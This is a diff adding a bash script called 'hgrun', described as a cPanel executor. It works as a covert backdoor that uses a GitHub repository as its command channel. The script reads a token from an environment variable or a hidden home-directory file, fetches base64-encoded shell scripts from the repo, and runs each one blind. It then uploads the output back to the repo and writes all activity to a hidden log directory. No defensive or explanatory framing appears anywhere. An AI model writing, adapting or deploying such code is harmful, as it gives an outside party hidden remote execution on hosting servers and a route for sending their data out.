@@ -1,0 +1,36 @@
+#!/bin/bash
+# hgrun — cPanel executor pulled straight as PLAIN TEXT from GitHub raw.
+set -u
+T="${GHT:-}"
+[ -z "$T" ] && { T=$(cat "$HOME/.ghr_tk" 2>/dev/null); }
+[ -z "$T" ] && exit 0
+API=https://api.github.com/repos/heinzo666/sync-assets/contents
+W="$HOME/.hgw"; mkdir -p "$W"; touch "$W/done"
+LOG="$W/log"; 
+{
+echo "[$(date -u +%FT%T)] start pid=$$ user=$(id -un)"
+F(){ timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$1" || true; }
+LIST=$(F "$API/lab/hgin?ref=main&t=$RANDOM")
+echo "list_len=${#LIST}"
+NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
+for N in $NAMES; do
+  grep -qxF "$N" "$W/done" && continue
+  J=$(F "$API/lab/hgin/$N?ref=main")
+  B=$(printf '%s' "$J" | sed 's/.*"content": *"//; s/".*//' | tr -d '\n ')
+  printf '%s' "$B" | base64 -d > "$W/x.sh" 2>"$W/b64err"
+  SZ=$(wc -c < "$W/x.sh"); BE=$(head -c 80 "$W/b64err")
+  echo "task=$N jlen=${#J} blen=${#B} sz=$SZ b64err=[$BE]"
+  chmod +x "$W/x.sh"
+  OUT=$(/bin/bash "$W/x.sh" 2>&1); RC=$?
+  OUTFILE="$W/o.txt"; { echo "RC=$RC SZ=$SZ"; echo "$OUT"; } > "$OUTFILE"
+  OB=$(base64 -w0 < "$OUTFILE")
+  printf '{"message":"res %s","content":"%s"}' "$N" "$OB" > "$W/p.json"
+  PUTC=$(timeout 30 curl -sS -o "$W/putresp" -w '%{http_code}' -X PUT \
+    -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
+    --data-binary @"$W/p.json" "$API/lab/hgout/${N%.sh}.json")
+  echo "put http=$PUTC resp=$(head -c 120 "$W/putresp")"
+  echo "$N" >> "$W/done"
+done
+echo "[$(date -u +%FT%T)] end"
+} >> "$LOG" 2>&1
+exit 0
